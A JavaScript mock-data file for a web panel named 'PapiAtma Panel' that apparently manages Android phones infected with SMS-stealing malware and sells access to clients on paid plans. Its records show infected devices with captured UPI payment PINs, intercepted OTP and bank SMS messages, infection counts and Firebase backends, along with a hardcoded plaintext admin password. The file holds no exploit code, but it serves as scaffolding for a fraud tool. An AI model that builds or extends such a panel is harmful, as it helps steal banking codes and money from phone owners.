// Mock data for PapiAtma Panel

export const mockUsers = [
  {
    id: '1',
    username: 'papiatma',
    password: 'freefire123@',
    role: 'admin',
    plan: 'Unlimited',
    expiryDate: null,
    createdAt: '2024-01-01',
    telegramId: '@papiatma'
  },
  {
    id: '2',
    username: 'client1',
    password: 'client123',
    role: 'client',
    plan: 'Premium',
    expiryDate: '2026-03-15',
    createdAt: '2026-01-15',
    telegramId: '@client1'
  },
  {
    id: '3',
    username: 'client2',
    password: 'client456',
    role: 'client',
    plan: 'Basic',
    expiryDate: '2026-02-28',
    createdAt: '2026-01-20',
    telegramId: '@client2'
  }
];

export const mockDevices = [
  {
    id: 1,
    status: 'offline',
    device: 'No Phone',
    model: 'V2338',
    upiPin: null,
    battery: 47,
    lastSeen: '01/02/2026 | 09:32 PM',
    added: '01/02/2026 | 09:32 PM',
    note: '-'
  },
  {
    id: 2,
    status: 'offline',
    device: '9608219437',
    model: 'moto g45 5g',
    upiPin: null,
    battery: 36,
    lastSeen: '30/01/2026 | 08:09 am',
    added: '30/01/2026 | 08:09 am',
    note: '-'
  },
  {
    id: 3,
    status: 'online',
    device: 'Redmi Note 12',
    model: 'redmi note 12',
    upiPin: '1234',
    battery: 78,
    lastSeen: '02/02/2026 | 06:00 PM',
    added: '15/01/2026 | 10:30 AM',
    note: 'Main device'
  },
  {
    id: 4,
    status: 'online',
    device: 'Samsung A54',
    model: 'SM-A546B',
    upiPin: '5678',
    battery: 92,
    lastSeen: '02/02/2026 | 06:01 PM',
    added: '10/01/2026 | 02:15 PM',
    note: 'Backup'
  },
  {
    id: 5,
    status: 'offline',
    device: 'OnePlus 11',
    model: 'CPH2449',
    upiPin: null,
    battery: 15,
    lastSeen: '28/01/2026 | 11:45 AM',
    added: '05/01/2026 | 09:00 AM',
    note: '-'
  }
];

export const mockSmsMessages = [
  {
    id: 1,
    device: 'Redmi Note 12',
    sender: '+91 98765 43210',
    message: 'Your OTP is 456789. Valid for 5 minutes.',
    timestamp: '02/02/2026 | 05:58 PM',
    type: 'otp'
  },
  {
    id: 2,
    device: 'Samsung A54',
    sender: 'HDFC Bank',
    message: 'Rs.5000 credited to your account ending 4521.',
    timestamp: '02/02/2026 | 05:45 PM',
    type: 'bank'
  },
  {
    id: 3,
    device: 'Redmi Note 12',
    sender: '+91 87654 32109',
    message: 'Meeting scheduled for tomorrow at 10 AM.',
    timestamp: '02/02/2026 | 04:30 PM',
    type: 'general'
  },
  {
    id: 4,
    device: 'OnePlus 11',
    sender: 'Paytm',
    message: 'Payment of Rs.250 received from John.',
    timestamp: '02/02/2026 | 03:15 PM',
    type: 'payment'
  },
  {
    id: 5,
    device: 'Samsung A54',
    sender: 'Amazon',
    message: 'Your order #123456 has been shipped.',
    timestamp: '02/02/2026 | 02:00 PM',
    type: 'general'
  }
];

export const mockStats = {
  total: 213,
  online: 47,
  offline: 166,
  pin: 29
};

export const mockActiveSessions = [
  {
    id: 1,
    device: 'Chrome on Windows',
    ip: '192.168.1.100',
    location: 'Mumbai, India',
    lastActive: '2 minutes ago',
    current: true
  },
  {
    id: 2,
    device: 'Firefox on MacOS',
    ip: '192.168.1.105',
    location: 'Delhi, India',
    lastActive: '1 hour ago',
    current: false
  }
];

export const mockFirebaseAccounts = [
  {
    id: 1,
    name: 'Primary Firebase',
    projectId: 'papiatma-panel-1',
    status: 'active'
  },
  {
    id: 2,
    name: 'Backup Firebase',
    projectId: 'papiatma-panel-2',
    status: 'active'
  }
];
